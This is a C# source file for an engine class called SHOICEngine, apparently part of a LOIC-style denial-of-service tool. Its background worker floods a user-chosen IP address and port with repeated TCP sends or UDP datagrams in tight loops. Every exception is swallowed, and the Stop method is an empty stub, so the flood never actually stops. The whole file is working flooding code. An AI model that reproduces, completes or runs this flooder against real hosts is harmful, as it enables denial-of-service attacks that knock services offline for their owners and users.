#region [Using]
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.ComponentModel;
using System.Net.Sockets;
#endregion [Using]

namespace SHOIC
{
public	class SHOICEngine
{
#region [Global]
bool bisflooding;
StructSHOIC stshoic=new StructSHOIC();
BackgroundWorker bw = new BackgroundWorker();
#endregion [Global]

#region [Constructor]
public SHOICEngine()
{
}
#endregion [Constructor]

#region [GetSet]
public StructSHOIC stSet
{
get{bGet();return stshoic;}
set{stshoic=value;bSet();}
}


private bool bGet()
{
return false;
}
private bool bSet()
{
return false;
}
#endregion [GetSet]


#region [Method]
public bool bStart()
{
try{
bisflooding = true;
bw.DoWork += new DoWorkEventHandler(BackgroundworkerProtocol1And2);
bw.RunWorkerAsync();
return true;
}catch{return false;}

}

public void Stop()
{//Ver luego
		//bw+=new Component().Dispose();

}
#endregion [Method]

#region [Event Handler]
private void BackgroundworkerProtocol1And2(object sender, DoWorkEventArgs e)
{
try{
byte[] buf = System.Text.Encoding.ASCII.GetBytes(stshoic.sdata);
var RHost = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(stshoic.sip), stshoic.iport);
while (this.bisflooding)
{


//Protocol 1
if (stshoic.iprotocol == 1)
{
Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp) { Blocking = stshoic.bresp };
socket.Connect(RHost);

try{

while (this.bisflooding)
{
//FloodCount++;
socket.Send(buf);
if (stshoic.idelay > 0) 
System.Threading.Thread.Sleep(stshoic.idelay);
}

}catch { }
}



//Protocol 2
if (stshoic.iprotocol == 2)
{
Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp) { Blocking = stshoic.bresp };

try{

while (this.bisflooding)
{
//FloodCount++;
socket.SendTo(buf, SocketFlags.None, RHost);
if (stshoic.idelay > 0) System.Threading.Thread.Sleep(stshoic.idelay);
}

}catch { }
}

}

}catch { }
}
#endregion [Event Handler]





	}//End class
}//End namespace
